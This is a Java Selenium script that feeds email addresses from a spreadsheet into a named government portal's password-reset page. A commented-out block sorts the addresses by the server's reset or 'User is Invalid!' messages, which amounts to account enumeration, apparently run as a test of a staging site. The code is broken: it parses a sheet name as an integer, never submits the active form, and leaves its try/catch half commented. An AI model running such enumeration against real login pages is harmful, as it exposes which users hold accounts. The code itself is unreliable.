package org.example;

import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Iterator;

public class EmailEnumerationwithexcel {

    public static void main(String[] args) throws InterruptedException, FileNotFoundException {
        WebDriver driver = new ChromeDriver();
        driver.manage().window().maximize();
        try {
            String excelFilePath = "C:\\Users\\Ravi Kumar Gupta\\Downloads\\EmailEnumeration.xlsx";
            FileInputStream inputStream = new FileInputStream(new File("C:\\Users\\Ravi Kumar Gupta\\Downloads\\EmailEnumeration.xlsx"));

            // Create a workbook object
            Workbook workbook = new XSSFWorkbook(inputStream);

            // Get the first sheet of the workbook
            Sheet sheet = workbook.getSheetAt(Integer.parseInt("EmailEnumeration"));
            int rowCount = sheet.getLastRowNum() - sheet.getFirstRowNum();
//
//            for (int i = 0; i <= rowCount; i++) {
//                Row row = sheet.getRow(i);
//
//                // Get the cell value from a specific column (assuming it's a string)
//                Cell cell = row.getCell(0);
//                String value = cell.getStringCellValue();
//
//                // Perform actions in Selenium using the value
//                driver.get(value);
            Iterator<Row> rowIterator = sheet.iterator();
            while (rowIterator.hasNext()) {
                Row row = rowIterator.next();
                Cell cell = row.getCell(0);
                String value = cell.getStringCellValue();

                // Perform actions in Selenium using the value

                driver.get("https://www.ppe.nsws.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-ppe&tab_id=npYtxtvJgqI");
                WebElement element = driver.findElement(By.id("inputField"));
                element.sendKeys(value);
                // ... perform other actions

                // Clear the input field for the next value
                element.clear();
            }
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }
//        int i;
//        String arr1[] = {"iec1@yopmail.com", "IEC@yopmail.com", "bhatiaverma@yopmail.com", "ravigupta@tothenew.com", "Testing@gmail.com", "Check@yopmail.com", "Tets@gmai.com"};
//        for (i = 0; i < arr1.length - 1; i++) {
//            // driver.get("https://sso-uat-nsws.investindia.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-stage&tab_id=XrK2mBE02Lw");
//          //  driver.get("https://www.ppe.nsws.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-ppe&tab_id=npYtxtvJgqI");
//            driver.findElement(By.xpath("//input[@id='username']")).sendKeys(arr1[i]);
//            driver.findElement(By.xpath("//button[@id='kc-reset-password-form']")).click();
//            Thread.sleep(2000);
//
//            String Message = driver.findElement(By.xpath("//span[@class='server-message']")).getText();
//            System.out.println(Message);
//
//            if (Message.contains("You should receive an email shortly with instructions on resetting your password.")) {
//                System.out.println(arr1[i]);
//            } else {
//                String Message1 = driver.findElement(By.xpath("//span[@id='input-error-password-change']")).getText();
//                System.out.println(Message1);
//
//                if (Message1.contains("User is Invalid!")) {
//                    System.out.println(arr1[i]);
//                }
//                driver.navigate().to("https://www.ppe.nsws.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-ppe&tab_id=npYtxtvJgqI");
//                //  driver.navigate().to("https://sso-uat-nsws.investindia.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-stage&tab_id=XrK2mBE02Lw");

//    } catch (IOException e) {
//            throw new RuntimeException(e);
        }
    }


